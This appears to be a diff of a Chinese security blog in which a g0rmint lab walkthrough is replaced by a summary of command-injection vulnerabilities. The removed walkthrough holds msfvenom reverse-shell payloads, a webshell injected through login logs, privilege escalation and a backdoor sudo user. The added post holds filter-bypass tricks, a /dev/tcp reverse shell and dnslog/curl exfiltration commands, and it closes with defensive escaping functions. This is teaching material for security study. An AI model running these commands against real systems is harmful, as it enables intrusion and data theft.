@@ -96,34 +96,23 @@
 
 
 
-  <meta name="description" content="前言这里自动设置的是桥接，记得修改为NAT 靶机难度不大，但是细节上存在大量问题">
-<meta name="keywords" content="渗透测试,提权,vulnhub">
+  <meta name="description" content="前言最近突然想到过去遇到命令执行漏洞时无法正常写文件，权限设置为777页无济于事，同时发现过去的笔记中有关命令执行漏洞的总结较少，因此这里重新总结一次。 关于无法写文件：将当前web目录的文件所有者更改为apache：chown apache:apache html即可">
+<meta name="keywords" content="web安全,命令执行漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="g0rmint渗透实战">
-<meta property="og:url" content="https://songxpu.github.io/2019/08/10/g0rmint/index.html">
+<meta property="og:title" content="命令执行漏洞总结">
+<meta property="og:url" content="https://songxpu.github.io/2019/08/27/命令执行漏洞总结/index.html">
 <meta property="og:site_name" content="Pines404">
-<meta property="og:description" content="前言这里自动设置的是桥接，记得修改为NAT 靶机难度不大，但是细节上存在大量问题">
+<meta property="og:description" content="前言最近突然想到过去遇到命令执行漏洞时无法正常写文件，权限设置为777页无济于事，同时发现过去的笔记中有关命令执行漏洞的总结较少，因此这里重新总结一次。 关于无法写文件：将当前web目录的文件所有者更改为apache：chown apache:apache html即可">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/ip.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/nmap-A.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/index.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/html.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/info.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/源码.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/reset.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/userinfo.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/后台.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/蚁剑1.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/蚁剑2.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/sysinfo.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/提权.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/flag.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/10/g0rmint/更换内核.png">
-<meta property="og:updated_time" content="2019-08-16T04:01:03.185Z">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/27/命令执行漏洞总结/dnslog.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/27/命令执行漏洞总结/burpsuite.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/27/命令执行漏洞总结/phpinfo.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/27/命令执行漏洞总结/逃逸.jpg">
+<meta property="og:updated_time" content="2019-08-27T13:58:08.608Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="g0rmint渗透实战">
-<meta name="twitter:description" content="前言这里自动设置的是桥接，记得修改为NAT 靶机难度不大，但是细节上存在大量问题">
-<meta name="twitter:image" content="https://songxpu.github.io/2019/08/10/g0rmint/ip.png">
+<meta name="twitter:title" content="命令执行漏洞总结">
+<meta name="twitter:description" content="前言最近突然想到过去遇到命令执行漏洞时无法正常写文件，权限设置为777页无济于事，同时发现过去的笔记中有关命令执行漏洞的总结较少，因此这里重新总结一次。 关于无法写文件：将当前web目录的文件所有者更改为apache：chown apache:apache html即可">
+<meta name="twitter:image" content="https://songxpu.github.io/2019/08/27/命令执行漏洞总结/dnslog.jpg">
 
 
 
@@ -131,7 +120,7 @@
 
   
   
-  <link rel="canonical" href="https://songxpu.github.io/2019/08/10/g0rmint/">
+  <link rel="canonical" href="https://songxpu.github.io/2019/08/27/命令执行漏洞总结/">
 
 
 
@@ -141,7 +130,7 @@
   };
 </script>
 
-  <title>g0rmint渗透实战 | Pines404</title>
+  <title>命令执行漏洞总结 | Pines404</title>
   
 
 
@@ -400,7 +389,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/08/10/g0rmint/">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/08/27/命令执行漏洞总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Azeroth">
@@ -417,7 +406,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">g0rmint渗透实战
+          <h1 class="post-title" itemprop="name headline">命令执行漏洞总结
 
               
             
@@ -443,24 +432,12 @@
                 
               
 
-              <time title="创建时间：2019-08-10 17:26:14" itemprop="dateCreated datePublished" datetime="2019-08-10T17:26:14+08:00">2019-08-10</time>
+              <time title="创建时间：2019-08-27 22:00:03 / 修改时间：21:58:08" itemprop="dateCreated datePublished" datetime="2019-08-27T22:00:03+08:00">2019-08-27</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-08-16 12:01:03" itemprop="dateModified" datetime="2019-08-16T12:01:03+08:00">2019-08-16</time>
               
             
           </span>
@@ -477,7 +454,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/渗透测试/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
 
                 
                 
@@ -513,7 +490,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">3.8k</span>
+                <span title="本文字数">2.9k</span>
               
 
               
@@ -547,133 +524,183 @@
       
 
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这里自动设置的是桥接，记得修改为NAT</p>
-<p>靶机难度不大，但是细节上存在大量问题</p>
- <a id="more"></a>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近突然想到过去遇到命令执行漏洞时无法正常写文件，权限设置为777页无济于事，同时发现过去的笔记中有关命令执行漏洞的总结较少，因此这里重新总结一次。</p>
+<p>关于无法写文件：将当前web目录的文件所有者更改为apache：<code>chown apache:apache html</code>即可</p>
+<a id="more"></a>
 
-<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p><strong>netdiscover</strong>:<code>netdiscover -r 192.168.64.0/24</code></p>
-<img src="//songxpu.github.io/2019/08/10/g0rmint/ip.png" width="700" height>
-
-<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><img src="//songxpu.github.io/2019/08/10/g0rmint/nmap-A.png" width="700" height>
-
-<p>仅开放22与80端口，看样子需要从web层面进行渗透</p>
-<h4 id="Web信息收集"><a href="#Web信息收集" class="headerlink" title="Web信息收集"></a>Web信息收集</h4><p><strong>（1）目录扫描</strong></p>
-<p>扫描器发现，网站根目录下存在robots.txt，打开提示/g0rmint/</p>
-<p>继续使用扫描器发现：login.php</p>
-<p>介绍kali下的目录扫描工具:<strong>dirb</strong></p>
-<p><code>dirb http://...........</code></p>
-<p><strong>（2）页面信息</strong></p>
-<img src="//songxpu.github.io/2019/08/10/g0rmint/index.png" width="500" height="500">
-
-<p>经过尝试并没有发现漏洞点，查看源码，发现一段提示:</p>
-<blockquote>
-<p>这里相当无语，我的靶机里并没有这一行代码，但网络上的教程中是显示有的</p>
+<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><blockquote>
+<p>命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：system()、exec()、shell_exec()、eval()、passthru()，``等函数，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</p>
 </blockquote>
-<img src="//songxpu.github.io/2019/08/10/g0rmint/html.png" width="800" height>
+<h3 id="命令执行几种方式"><a href="#命令执行几种方式" class="headerlink" title="命令执行几种方式"></a>命令执行几种方式</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>注意事项</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>system()</td>
+<td></td>
+</tr>
+<tr>
+<td>passthru()</td>
+<td></td>
+</tr>
+<tr>
+<td>exec()、shell_exec()</td>
+<td>无回显</td>
+</tr>
+<tr>
+<td>反引号``</td>
+<td>命令交给shell_exec()执行</td>
+</tr>
+<tr>
+<td>popen()、proc_open()</td>
+<td>无回显，返回文件指针，但命令执行了的</td>
+</tr>
+</tbody></table>
+<p>以popen()为例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">popen('whoami &gt;&gt;/tmp/1.txt','r');</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>访问后仍然404，但用扫描器发现了一些信息 </p>
-<p><code>dirb http://192.168.64.144/g0rmint/s3cretbackupdirect0ry/</code></p>
-<img src="//songxpu.github.io/2019/08/10/g0rmint/info.png" width="700" height>
-
-<p>访问info.php，得到信息：backup.zip；成功下载获取源码</p>
-<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><img src="//songxpu.github.io/2019/08/10/g0rmint/源码.png" width="500" height>
-
-<p>想着登录到后台，从<code>db.sql</code>中找到了一条信息</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`g0rmint`</span> (<span class="string">`id`</span>, <span class="string">`username`</span>, <span class="string">`email`</span>, <span class="string">`pass`</span>) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">'demo'</span>, <span class="string">'demo@example.com'</span>, <span class="string">'fe01ce2a7fbac8fafaed7c982a04e229'</span>);`</span><br></pre></td></tr></table></figure>
-
-<p>MD5解密=&gt;demo</p>
-<p>但是发现无法登录，可能是该信息是最原始的密码。</p>
-<p>查看<code>reset.php</code>:</p>
-<img src="//songxpu.github.io/2019/08/10/g0rmint/reset.png" width="700" height>
-
-<p>密码是截取gmdate()函数生成的日期的前20位，再先后加密得到的</p>
-<p>而修改密码需要提供账户名和邮箱名，使用<code>db.sql</code>中的信息失败</p>
-<p>经网上教程提醒，全局搜索email，在某个css文件中查找到了这条信息：</p>
-<img src="//songxpu.github.io/2019/08/10/g0rmint/userinfo.png" width="500" height>
-
-<p>修改登录，最终成功登录进入后台：</p>
-<img src="//songxpu.github.io/2019/08/10/g0rmint/后台.png" width="800" height>
-
-<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>发现后台并没有什么利用点，继续审查代码</p>
-<p>在<code>login.php</code>中可以看到</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123; <span class="comment">// If form is submitted</span></span><br><span class="line">    $email = $_POST[<span class="string">'email'</span>];</span><br><span class="line">    $pass = md5($_POST[<span class="string">'pass'</span>]);</span><br><span class="line"></span><br><span class="line">    $sql = $pdo-&gt;prepare(<span class="string">"SELECT * FROM g0rmint WHERE email = :email AND pass = :pass"</span>);</span><br><span class="line">    $sql-&gt;bindParam(<span class="string">":email"</span>, $email);</span><br><span class="line">    $sql-&gt;bindParam(<span class="string">":pass"</span>, $pass);</span><br><span class="line">    $row = $sql-&gt;execute();</span><br><span class="line">    $result = $sql-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">    <span class="keyword">if</span> (count($result) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        session_start();</span><br><span class="line">        $_SESSION[<span class="string">'username'</span>] = $result[<span class="string">'username'</span>];</span><br><span class="line">        header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $log = $email;</span><br><span class="line">        $reason = <span class="string">"Failed login attempt detected with email: "</span>;</span><br><span class="line">        addlog($log, $reason);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>其中addlog()定义位于config.php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addlog</span><span class="params">($log, $reason)</span> </span>&#123;</span><br><span class="line">    $myFile = <span class="string">"s3cr3t-dir3ct0ry-f0r-l0gs/"</span> . date(<span class="string">"Y-m-d"</span>) . <span class="string">".php"</span>;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($myFile)) &#123;</span><br><span class="line">        $fh = fopen($myFile, <span class="string">'a'</span>);</span><br><span class="line">        fwrite($fh, $reason . $log . <span class="string">"&lt;br&gt;\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $fh = fopen($myFile, <span class="string">'w'</span>);</span><br><span class="line">        fwrite($fh, file_get_contents(<span class="string">"dummy.php"</span>) . <span class="string">"&lt;br&gt;\n"</span>);</span><br><span class="line">        fclose($fh);</span><br><span class="line">        $fh = fopen($myFile, <span class="string">'a'</span>);</span><br><span class="line">        fwrite($fh, $reason . $log . <span class="string">"&lt;br&gt;\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fh);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可见，当登录失败时，email信息将会被写入到php文件中，即可写入一句话，成功获取webshell</p>
-<img src="//songxpu.github.io/2019/08/10/g0rmint/蚁剑1.png" width="600" height>
-
-<img src="//songxpu.github.io/2019/08/10/g0rmint/蚁剑2.png" width="600" height>
-
-<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>查看系统信息</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
-
-<img src="//songxpu.github.io/2019/08/10/g0rmint/sysinfo.png" width="800" height>
-
-<p>版本信息为：<strong>Ubuntu 16.04</strong>，存在一种本地提权的方法</p>
-<p>参考文章：</p>
-<ol>
-<li><a href="https://www.cnblogs.com/hookjoy/p/8616250.html" target="_blank" rel="noopener">Ubuntu16.04 本地提权漏洞复测过程</a></li>
-<li><a href="http://blog.nsfocus.net/cve-2017-16995-ubuntu/" target="_blank" rel="noopener">【漏洞复现】Ubuntu本地提权漏洞CVE-2017-16995</a></li>
-</ol>
+<p>查看1.txt得到结果</p>
+<h2 id="命令执行绕过技巧"><a href="#命令执行绕过技巧" class="headerlink" title="命令执行绕过技巧"></a>命令执行绕过技巧</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ul>
+<li><p><code>&lt; 与 &lt;&gt;</code>       仅适用于文件读取等操作，例如：<code>cat&lt;flag</code></p>
+</li>
+<li><p><code>%09</code>   TAB的url编码</p>
+</li>
+<li><p><code>${IFS} $IFS$9</code>  </p>
+</li>
+</ul>
 <blockquote>
-<p>这里又是一个坑点，我无论用何种exp，都会提醒各种错误，这个过程花了一个上午，最终还不知道是怎么成功的…但不管怎么说，这几种exp在webshell的虚拟终端是无法执行成功的，需要反弹shell</p>
+<p>${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，然而本地实验却会发生这种情况，这里解释一下,单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
 </blockquote>
-<p>反弹shell此处给出本例使用过的两种通过metasploit反弹的方式</p>
-<ol>
-<li>二进制文件</li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+<h3 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h3><table>
+<thead>
+<tr>
+<th>分隔符</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%0a</td>
+<td>换行符</td>
+</tr>
+<tr>
+<td>%0d</td>
+<td>回车符</td>
+</tr>
+<tr>
+<td>;</td>
+<td>在Linux shell中担任连续指令[将显示所有指令结果]</td>
+</tr>
+<tr>
+<td>&amp;</td>
+<td>A&amp;B 简单拼接无制约关系。如果A为假，则B立即执行</td>
+</tr>
+<tr>
+<td>|</td>
+<td>A|B 左边输出作为右边的输入，显示B的执行结果</td>
+</tr>
+<tr>
+<td>&amp;&amp;</td>
+<td>A&amp;&amp;B 只有A执行成功，B才会执行</td>
+</tr>
+<tr>
+<td>||</td>
+<td>A||B 只有A执行失败，B才会执行</td>
+</tr>
+</tbody></table>
+<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><ul>
+<li><code>${PS2}</code> 对应字符 &gt;</li>
+<li><code>${PS4}</code> 对应字符 +</li>
+<li><code>${9}</code> 对应 空字符串</li>
+</ul>
+<h4 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;$a$b</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.64.131</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo Y2F0IDEudHh0|base64 -d|bash</span><br><span class="line"><span class="meta">#</span><span class="bash">cat 1.txt</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编码</span></span><br><span class="line">echo "cat 1.txt"|xxd -p</span><br><span class="line"><span class="meta">#</span><span class="bash">解码</span></span><br><span class="line">echo "63617420312e7478740a"|xxd -r -p |bash</span><br></pre></td></tr></table></figure>
+
+<h4 id="单、双引号"><a href="#单、双引号" class="headerlink" title="单、双引号"></a>单、双引号</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca""t fla''g</span><br></pre></td></tr></table></figure>
+
+<h4 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\a\t f\l\a\g</span><br></pre></td></tr></table></figure>
+
+<h3 id="无回显的命令执行"><a href="#无回显的命令执行" class="headerlink" title="无回显的命令执行"></a>无回显的命令执行</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><blockquote>
+<p>此处列举的反弹shell存在局限性，一些环境下无法正常使用，之后重新总结一下反弹shell</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash">远程监听</span></span><br><span class="line">nc -lvp 8080</span><br></pre></td></tr></table></figure>
+
+<h4 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h4><blockquote>
+<p>``中的命令实际上调用了shell_exec()函数</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://07isyd.dnslog.cn/`whoami`</span><br><span class="line">ping `whoami`.07isyd.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/08/27/命令执行漏洞总结/dnslog.jpg" width="500">
+
+<h4 id="curl上传文件"><a href="#curl上传文件" class="headerlink" title="curl上传文件"></a>curl上传文件</h4><blockquote>
+<p>curl -F将flag文件上传至Burpsuite中的Collaborator Client，类似于DNSLOG，但可以查看POST请求包</p>
+<p>实际上也可以将flag文件上传至vps某个端口监听</p>
+</blockquote>
+<p><strong>打开Collaborator Client</strong>：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">打开Burp主界面 --&gt;菜单（Burp）--&gt;Burp Collaboraor<span class="built_in"> Client </span>-- &gt; 点击 Copy <span class="keyword">to</span> Clipboard</span><br><span class="line">粘贴出来大概这样：XXXXXXXXXXXXXXXXXXXXXX.burpcollaborator.net</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/08/27/命令执行漏洞总结/burpsuite.jpg" width="500">
+
+<h3 id="短命令执行"><a href="#短命令执行" class="headerlink" title="短命令执行"></a>短命令执行</h3><blockquote>
+<p>大体思路为将命令分割为一个个小部分，写成文件名，再通过ls写入到一个文件中并执行。</p>
+<p>但利用起来发现也挺苛刻的，网上一些教程复现下来失败</p>
+</blockquote>
+<p><strong>复现反思</strong>：</p>
+<p>直接利用<code>1&gt;1</code>这样的方式写命令是不可行的，因为执行<code>ls -t &gt; a</code>这一步会在每一个文件名的后面加一个换行符，导致无法执行。</p>
+<blockquote>
+<p>两个反斜杠<code>\\</code>，这种方法是利用<code>\</code>来拼接字符串，其中前一个<code>\</code>是用来转义后一个<code>\</code>的。这种方法的话需要精心构造输入，利用倒叙来输入，然后<code>ls</code>的时候需要加<code>-t</code>参数来排列一下，虽然报错了但是也执行成功了。</p>
+</blockquote>
+<p><strong>环境</strong>：物理机web目录index.html中写入phpinfo</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">hp</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">ell.p\\</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">\ sh\\</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">\ -O\\</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">0.117\\</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">168.\\</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">\ 192.\\</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wget\\</span></span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+
+<p>然后生成shell.php，访问即phpinfo界面</p>
+<img src="//songxpu.github.io/2019/08/27/命令执行漏洞总结/phpinfo.jpg" width="500">
+
+<h3 id="IP绕过"><a href="#IP绕过" class="headerlink" title="IP绕过"></a>IP绕过</h3><p><a href="http://ip.chacuo.net/ipcalc" target="_blank" rel="noopener">转换网址</a> <a href="http://tool.oschina.net/hexconvert/" target="_blank" rel="noopener">进制转换</a></p>
+<p>例如：<code>127.0.0.1</code> =&gt; <code>017700000001</code></p>
+<p>将IP的每一位先从十进制转换为十六进制，再转为八进制，在八进制前添加一个0.</p>
+<h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><h3 id="命令防注入函数"><a href="#命令防注入函数" class="headerlink" title="命令防注入函数"></a>命令防注入函数</h3><ol>
+<li><strong>escapeshellcmd()和escapeshellarg()</strong></li>
+</ol>
+<ul>
+<li><strong>escapeshellcmd</strong>(string $command):</li>
+</ul>
+<p>顾名思义，该函数是过滤整条命令的从，传入参数为命令。</p>
+<p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 </p>
+<p>反斜线（\）会在以下字符之前插入： <strong>&amp;#`;|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF</strong>，<em>’</em> 和 *”* 仅在不配对的时候被转义。</p>
+<p>在Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被<code>^</code>转义。</p>
+<p>在Linux平台上，字符被反斜杠<code>\</code>转义。</p>
+<ul>
+<li><strong>escapeshellarg</strong>(string $command):</li>
+</ul>
+<p>escapeshellarg()的功能是过滤参数，将参数限制在一对双引号里，确保参数为一个字符串，它会将双引号替换为空格</p>
+<p>此处想顺便写一下，这两种函数一起用的时候也存在逃逸的情况：</p>
+<img src="//songxpu.github.io/2019/08/27/命令执行漏洞总结/逃逸.jpg" width="700">
 
 <ol start="2">
-<li>PHP文件</li>
+<li><strong>addslashes()等过滤sql语句的函数</strong></li>
 </ol>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter_reverse_tcp</span><br><span class="line">set lhost 192.168.64.131</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p>由于目标服务器没有gcc，于是在本地Linux系统中生成exp：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c exp.c -o exp</span><br></pre></td></tr></table></figure>
-
-<p>将exp上传至目标服务器中，在msf shell中执行，成功提权：</p>
-<img src="//songxpu.github.io/2019/08/10/g0rmint/提权.png" width>
-
-<p>在/root/目录下获取到flag</p>
-<img src="//songxpu.github.io/2019/08/10/g0rmint/flag.png" width>
-
-<p>至此，渗透实验基本完成。</p>
-<p>我这里额外添加了一个普通用户，并将它加入到管理员和sudo组</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">useradd hacker</span><br><span class="line">passwd hacker</span><br><span class="line">usermod -s /bin/bash hacker</span><br><span class="line">usermod -g root hacker</span><br><span class="line">usermod -aG sudo hacker</span><br></pre></td></tr></table></figure>
-
-<p>这里因为在msf shell中，不能顺利的修改文件，这里没有完全将普通用户提升为root权限。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id hacker</span><br><span class="line">uid=1001(hacker) gid=0(root) groups=0(root),27(sudo)</span><br></pre></td></tr></table></figure>
-
-<h3 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h3><blockquote>
